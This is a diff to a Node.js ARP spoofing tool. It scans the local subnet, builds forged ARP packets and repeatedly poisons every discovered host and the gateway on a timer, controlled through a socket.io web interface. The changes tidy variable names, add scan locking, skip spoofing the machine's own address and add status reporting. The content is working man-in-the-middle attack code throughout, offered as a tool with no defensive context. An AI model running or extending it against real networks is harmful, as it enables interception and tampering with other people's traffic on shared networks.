@@ -23,7 +23,7 @@ const isWin       = (process.platform === 'win32')
 const isLinux     = (process.platform === 'linux')
 const isOSX       = (process.platform === 'darwin')
 const spoofinterval = 4000; // send arp spoof ever N ms
-const scaninterval = 20000; // check for new hosts every N
+const scaninterval = 30000; // check for new hosts every N
 
 /*  END  */
 
@@ -84,7 +84,7 @@ const gatewayip             = args['gateway'] || null; // TODO: could replace th
 let   netinterface;
 let   ip_range_start        = args['ip-range-start'] || null;
 let   ip_range_end          = args['ip-range-end'] || null;
-let   myip                  = args['our-ip'] || null;
+let   ourip                  = args['our-ip'] || null;
 let   start_now             = args['start'] && args['start'] === 'no' ? false : true;
 
 console.log('\nNetwork interfaces:');
@@ -100,9 +100,9 @@ Object.entries(require('os').networkInterfaces()).forEach(entry => {
     else
         console.log(`${devicename}`);
     if (entry[1].length > 0) {
-        if (!myip && netinterface === devicename) {// assume first addr is ours
-            myip = entry[1][0].address;
-            mymac = entry[1][0].mac;
+        if (!ourip && netinterface === devicename) {// assume first addr is ours
+            ourip = entry[1][0].address;
+            ourmac = entry[1][0].mac;
         }
         entry[1].forEach(address => {
             console.log(` ${address.address} / ${address.netmask}`) 
@@ -113,8 +113,8 @@ Object.entries(require('os').networkInterfaces()).forEach(entry => {
 });
 
 if (netinterface && ! ip_range_start) {
-    ip_range_start = myip.split('.').slice(0,-1).join('.')+'.1', 
-    ip_range_end   = myip.split('.').slice(0,-1).join('.')+'.254'
+    ip_range_start = ourip.split('.').slice(0,-1).join('.')+'.1', 
+    ip_range_end   = ourip.split('.').slice(0,-1).join('.')+'.254'
 }
 
 
@@ -122,8 +122,8 @@ console.log('\nSettings');
 if (netinterface) {
     console.log(` interface : '${netinterface}'`);
     console.log(`  ip range : '${ip_range_start}' to '${ip_range_end}'`);
-    console.log(`     my ip : '${myip}'`);
-    console.log(`    my mac : '${mymac}'`);
+    console.log(`    our ip : '${ourip}'`);
+    console.log(`   our mac : '${ourmac}'`);
     console.log(`gateway ip : '${gatewayip}'`);
     console.log(` start now : '${start_now}'`);
 }
@@ -169,8 +169,8 @@ function poison_packet(ourmac, ourip, victimip, tellip) {
     // turn '00:00:00:..' into ['0x00','0x00'] which new Buffer is fine with converting
     if (typeof ourmac    === 'string')    ourmac = ourmac.split(':').map(x=>'0x'+x)
     if (typeof ourip     === 'string')     ourip = ourip.split('.')
-    if (typeof tellip    === 'string')    tellip = tellip.split('.')
     if (typeof victimip  === 'string')  victimip = victimip.split('.')
+    if (typeof tellip    === 'string')    tellip = tellip.split('.')
     return new Buffer.from([
         // ETHERNET
         // 0    = Destination MAC
@@ -215,19 +215,32 @@ function poison_packet(ourmac, ourip, victimip, tellip) {
 
 
 
-// code currently appends to found_hosts so if target (e.g.phone) comes out 
-// of sleep it does not need to be re-discovered
+// found_hosts  : all hosts ever found
+//   can be useful to spoof these to catch devices coming out of sleep
 let found_hosts = {}; // {mac1:ip,mac2:ip}
-let recent_hosts = {}; // {mac1:ip,mac2:ip} but only last scan found
-let filter_ips = myip ? [myip] : [] // ip's to filter from webui
+// recent_hosts : the hosts only from last scan
+let recent_hosts = {}; // {mac1:ip,mac2:ip} 
+// spoof_hosts  : hosts the spoofloop will actively attempt to spoof
+// let spoof_hosts = {}; // {mac1:ip,mac2:ip} 
+// filter_ips   : arrive of ip's we skip for spoofing (ourip auto skipped)
+let filter_ips = [] //
+
+
 let scantimer;
 let spooftimer;
 let spoofpause = false; // scanner sets this to be sure we dont respond to our own ping requests
+let scanbusy = false;
 
-function scan1(ip_range_start, ip_range_end, filter_ips, callback) {
+function scan1(ip_range_start, ip_range_end, callback) {
+    if (scanbusy) {
+        console.log('scan1 busy, skip')
+        return
+    }
     spoofpause = true; // stop spoofer so it doesnt confuse our scan
-    nettools.scan(ip_range_start,ip_range_end, filter_ips, ret => {
+    scanbusy = true;
+    nettools.scan(ip_range_start,ip_range_end, []/*filter_ips*/, ret => {
         spoofpause = false;
+        scanbusy = false;
         if (ret) {
             found_hosts = Object.assign({}, found_hosts, ret); // add found hosts
             recent_hosts = ret;
@@ -236,11 +249,13 @@ function scan1(ip_range_start, ip_range_end, filter_ips, callback) {
             callback(ret)
     })
 }
-function scanloop(ip_range_start, ip_range_end, filter_ips, interval, callback) {
-    if (!scantimer)
+function scanloop(ip_range_start, ip_range_end, interval, callback) {
+    if (!scantimer) {
+        scan1(ip_range_start, ip_range_end, callback)
         scantimer = setInterval(() => {
-            scan1(ip_range_start, ip_range_end, filter_ips, callback)
+            scan1(ip_range_start, ip_range_end, callback)
         }, interval);
+    }
 }
 function scanstop() { 
     if (scantimer) {
@@ -250,20 +265,25 @@ function scanstop() {
 }
 
 function spoof1(ourmac, ourip, gatewayip, targetip) {
+    // never spoof ourselves
+    if (gatewayip === ourip || targetip === ourip)
+        return;
     send(poison_packet(ourmac, ourip, targetip, gatewayip))
     if (gatewayip !== targetip)
         send(poison_packet(ourmac, ourip, gatewayip, targetip))
 }
 // reads global found_hosts and spoofs each every N ms
-function spoofloop(ourmac, ourip, gatewayip, interval, callback) {
+function spoofloop(ourmac, ourip, gatewayip, hosts, interval, callback) {
     spoofpause = false
+    // If already started don't bother:
     if (!spooftimer)
         spooftimer = setInterval(() => {
             if (!spoofpause) 
-                Object.values(found_hosts).forEach(targetip => {
+                Object.values(hosts).forEach(targetip => {
                     spoof1(ourmac,ourip,gatewayip,targetip, callback)
                 });
         }, interval);
+    
 }
 function spoofstop() { 
     if (spooftimer) {
@@ -301,31 +321,33 @@ function send(packet) {
 
 
 
-if (start_now  && gatewayip && ip_range_start && ip_range_end && filter_ips && mymac && myip && gatewayip) {
+if (start_now  && gatewayip && ip_range_start && ip_range_end && ourmac && ourip && gatewayip) {
     console.log('## Starting arp spoof from shell')
     const async = require('async');
     async.waterfall([
         function (callback) {
-            // run scan once, then start scanner
-            // pass through call back so we continue to next after
-            scan1(ip_range_start, ip_range_end, filter_ips, ret => {callback(null)})
-            scanloop(ip_range_start, ip_range_end, filter_ips, scaninterval)
+            // run scan once first
+            //  pass through call back so we continue to next after
+            scan1(ip_range_start, ip_range_end, ret => {callback(null)})
+            // start delayed looper
+            scanloop(ip_range_start, ip_range_end, scaninterval)
         },
         function (callback) {
-            spoofloop(mymac,myip,gatewayip,spoofinterval)
+            // spoof found_ip's which is updated routinely by scanloop
+            spoofloop(ourmac,ourip,gatewayip,found_hosts,spoofinterval)
         },
         // OLDER SIMPLER TEST ROUTINES:
         // function (callback) {
-        //     scan1(ip_range_start,ip_range_end, myip, ret => callback('found_hosts',ret))
+        //     scan1(ip_range_start,ip_range_end, ourip, ret => callback('found_hosts',ret))
         //     // OR:
-        //     // let filter_ips = [myip]
+        //     // let filter_ips = [ourip]
         //     // nettools.scan(ip_range_start,ip_range_end, filter_ips, ret => {
         //     //     callback('found_hosts',ret)
         //     // })
         // },
         // function (callback) {
         //     console.log('test one host (my phone) ')
-        //     let ourip    = myip || '192.168.178.26'
+        //     let ourip    = ourip || '192.168.178.26'
         //     let ourmac   = '3c:a9:f4:21:00:7c'
         //     let phoneip  = '192.168.178.23'
         //     let phonemac = 'a4:4b:d5:a6:c1:0b'
@@ -363,19 +385,27 @@ io.sockets.on('connect', socket => {
 
 
     // give client all information
-    if (!Object.keys(found_hosts).length > 0)
+    if (Object.keys(found_hosts).length > 0)
         socket.emit('found_hosts', found_hosts);
-    if (!Object.keys(recent_hosts).length > 0)
+    if (Object.keys(recent_hosts).length > 0)
         socket.emit('recent_hosts', recent_hosts);
-    if (!Object.keys(filter_ips).length > 0)
-        socket.emit('filter_ips', filter_ips);            
+    if (Object.keys(filter_ips).length > 0)
+        socket.emit('filter_ips', filter_ips);
+    socket.emit('status', {
+        scanloop_running: scantimer ? true : false,
+        spoofloop_running: spooftimer ? true : false
+     })
 
-    if (gatewayip && ip_range_start && ip_range_start && myip)
+
+    if (gatewayip && ip_range_start && ip_range_start && ourip && ourmac)
         socket.emit('network_settings', {
             gatewayip     : gatewayip,
             ip_range_start: ip_range_start,
             ip_range_end  : ip_range_end,
-            myip          : myip
+            ourip         : ourip,
+            ourmac        : ourmac,
+            scaninterval  : scaninterval,
+            spoofinterval : spoofinterval
         })
         
     socket.on('get_found_hosts', () => {
@@ -393,6 +423,7 @@ io.sockets.on('connect', socket => {
 
     socket.on('do_scan1', params => {
         console.log('do_scan1', params);
+        // params.filter_ips.push(params.ourip)
         scan1(params.ip_range_start, 
                 params.ip_range_end, 
                 params.filter_ips, 
@@ -403,10 +434,9 @@ io.sockets.on('connect', socket => {
         console.log('start_scanloop', params);
         scanloop(params.ip_range_start, 
                     params.ip_range_end, 
-                    params.filter_ips, 
-                    params.interval,
+                    params.scaninterval,
                     ret => {
-                    io.to('arpspoof').emit('recent_hosts', ret);
+                    // io.to('arpspoof').emit('recent_hosts', ret);
                     io.to('arpspoof').emit('found_hosts', found_hosts);
                 });
     });
@@ -414,25 +444,43 @@ io.sockets.on('connect', socket => {
 
     socket.on('start_spoofloop', params => {
         console.log('start_spoofloop', params);
+        if (params.filter_ips)
+           filter_ips = params.filter_ips
         spoofloop(params.ourmac, 
                     params.ourip, 
                     params.gatewayip, 
-                    params.interval)
+                    found_hosts,
+                    params.spoofinterval)
     });
     socket.on('stop_spoofloop', spoofstop);
 
-    socket.on('get_spoofloop_status', ()=>{
-        var statush = spooftimer ? true : false;
-        console.log('get_spoofloop_status', status);
-        socket.emit('spoofloop_status', {
-            running: status
-        })
+    socket.on('get_status', ()=>{
+        // console.log('status');
+        socket.emit('status', {
+            scanloop_running: scantimer ? true : false,
+            spoofloop_running: spooftimer ? true : false })
     });
 
     socket.on('set_spoof_hosts', params => {
         console.log('set_spoof_hosts',params);
         found_hosts = params
     });
+    socket.on('set_filter_ips', params => {
+        console.log('set_filter_ips',params);
+        set_filter_ips = params
+    });
+
+    let names_running = false;
+    socket.on('get_names', ips => {
+        console.log('get_names',ips)
+        if (ips.length && !names_running) 
+            nettools.names(ips, names => { // {ip:name,ip:undefined,...}
+                console.log('names', names);
+                socket.emit('names', names);
+                names_running = false
+            })
+    });
+
 });
 
 
